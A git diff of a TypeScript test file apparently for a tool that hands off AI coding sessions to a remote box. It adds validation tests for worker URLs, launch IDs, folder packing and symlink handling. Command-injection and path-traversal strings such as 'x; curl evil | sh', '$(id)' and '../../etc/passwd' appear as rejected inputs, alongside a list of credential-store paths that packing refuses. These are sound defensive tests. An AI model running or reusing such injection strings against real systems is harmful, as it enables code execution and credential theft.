@@ -1,12 +1,12 @@
 import { describe, expect, test } from "bun:test";
 import { execFileSync } from "node:child_process";
-import { chmodSync, mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
+import { chmodSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { b64url, generateEphemeralKeyPair } from "../core/crypto";
 import { buildPairURL } from "../core/pair-url";
 import {
-  BOX_MACHINE_NAME, bakeScript, PAIR_FN, targetWorker, boxPairPayload, createBody, lastModel, latestSession, paneScript, projectDirName,
+  BOX_MACHINE_NAME, bakeScript, checkLaunchIds, PAIR_FN, PAIR_POLL, packRefusal, SHM_SWEEP, targetWorker, userLayerFiles, boxPairPayload, createBody, lastModel, latestSession, paneScript, projectDirName,
   pubRawFromPkcs8, q, RELAY_PORT, resultPage, takePairUrl, toOpenRouterModel, withReload,
 } from "./handoff";
 import { RELAY_PORT as RELAY_LISTEN_PORT } from "./or-relay";
@@ -114,6 +114,65 @@ describe("handoff pure logic", () => {
     expect(() => targetWorker("api.nomo.gg; rm -rf /", undefined)).toThrow();
   });
 
+  test("target worker: https only, http just for loopback, never userinfo or a path", () => {
+    expect(targetWorker("http://localhost:8787", undefined)).toBe("http://localhost:8787");
+    expect(targetWorker("http://127.0.0.1:8787", undefined)).toBe("http://127.0.0.1:8787");
+    expect(targetWorker("http://[::1]:8787", undefined)).toBe("http://[::1]:8787");
+    expect(() => targetWorker("http://staging.example.workers.dev", undefined)).toThrow(/https/);
+    expect(() => targetWorker("https://user:pw@staging.example.workers.dev", undefined)).toThrow();
+    expect(() => targetWorker("https://api.nomo.gg@evil.example", undefined)).toThrow();
+    expect(() => targetWorker("https://staging.example.workers.dev/path", undefined)).toThrow();
+    expect(() => targetWorker("ftp://staging.example.workers.dev", undefined)).toThrow();
+  });
+
+  test("a folder is never packed whole when it is, or holds, home or a credential store", () => {
+    const none = () => false;
+    expect(packRefusal("/home/me", "/home/me", none)).toMatch(/home folder/);
+    expect(packRefusal("/home", "/home/me", none)).toMatch(/home folder/);
+    expect(packRefusal("/", "/home/me", none)).toMatch(/home folder/);
+    expect(packRefusal("/home/me/app", "/home/me", none)).toBeUndefined();
+    expect(packRefusal("/srv/app", "/home/me", none)).toBeUndefined();
+    expect(packRefusal("/home/me/..odd", "/home/me", none)).toBeUndefined();
+    for (const p of [".claude", ".config/cc-status", ".ssh", ".gnupg", ".aws", "Library/Keychains"]) {
+      expect(packRefusal("/home/me/app", "/home/me", (x) => x === `/home/me/app/${p}`)).toBe(`/home/me/app contains ${p}`);
+    }
+  });
+
+  test("session id must be a UUID and the model a plain id before either reaches the launch line", () => {
+    const u = "0b5c3d1e-2f4a-4b6c-8d9e-0f1a2b3c4d5e";
+    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5")).not.toThrow();
+    expect(() => checkLaunchIds(u, "anthropic/claude-opus-5.5[1m]")).not.toThrow();
+    expect(() => checkLaunchIds(u, "x; curl evil | sh")).toThrow(/model id/);
+    expect(() => checkLaunchIds(u, "$(id)")).toThrow(/model id/);
+    expect(() => checkLaunchIds(u, "")).toThrow(/model id/);
+    expect(() => checkLaunchIds("../../etc/passwd", "m")).toThrow(/UUID/);
+    expect(() => checkLaunchIds(`${u}; rm -rf /`, "m")).toThrow(/UUID/);
+  });
+
+  test("user layer: links inside their folder are followed, links outside it are skipped", () => {
+    const d = mkdtempSync(join(tmpdir(), "nomo-layer-"));
+    const home = join(d, ".claude"), outside = join(d, "outside");
+    mkdirSync(join(home, "skills", "real"), { recursive: true });
+    mkdirSync(outside, { recursive: true });
+    writeFileSync(join(home, "skills", "real", "SKILL.md"), "x");
+    writeFileSync(join(outside, "secret"), "s");
+    writeFileSync(join(home, ".credentials.json"), "{}");
+    writeFileSync(join(outside, "CLAUDE.md"), "# mine");
+    symlinkSync(join(home, "skills", "real"), join(home, "skills", "alias"));      // inside → followed
+    symlinkSync(outside, join(home, "skills", "escape"));                         // outside → skipped
+    symlinkSync(join(home, ".credentials.json"), join(home, "skills", "creds"));  // ~/.claude but not skills → skipped
+    symlinkSync(join(home, "skills"), join(home, "skills", "real", "loop"));      // a loop → not walked forever
+    symlinkSync(join(outside, "CLAUDE.md"), join(home, "CLAUDE.md"));             // top-level file link → followed
+    const { files, skipped } = userLayerFiles(home, ["skills", "CLAUDE.md"]);
+    expect(files.sort()).toEqual(["CLAUDE.md", "skills/alias/SKILL.md", "skills/real/SKILL.md"]);
+    expect(skipped.sort()).toEqual(["skills/creds", "skills/escape"]);
+  });
+
+  test("every non-handoff box script first drops a stale /dev/shm/nomo-env", () => {
+    for (const s of [paneScript("send"), paneScript("key"), paneScript("screen"), PAIR_POLL]) expect(s.startsWith(SHM_SWEEP)).toBe(true);
+    expect(SHM_SWEEP).toContain("-mmin +1"); // never one a handoff in flight just wrote
+  });
+
   // nomo_pair run for real in bash, with the box paths pointed at a temp dir and bun/tmux stubbed.
   function runPair(config: object | null, worker?: string): string {
     const d = mkdtempSync(join(tmpdir(), "nomo-pairfn-"));
@@ -131,7 +190,7 @@ describe("handoff pure logic", () => {
   }
 
   test("box pairing: same worker → kept; different worker → re-paired to the target", () => {
-    const stg = "https://api-status-push-staging.karrixlee1231.workers.dev";
+    const stg = "https://staging.example.workers.dev";
     expect(runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" })).toBe("NOMO_PAIRED\n");
     expect(runPair({ url: stg, e2eKeyB64: "k" }, stg)).toBe("NOMO_PAIRED\n");
     const re = runPair({ url: "https://api.nomo.gg", e2eKeyB64: "k" }, stg);
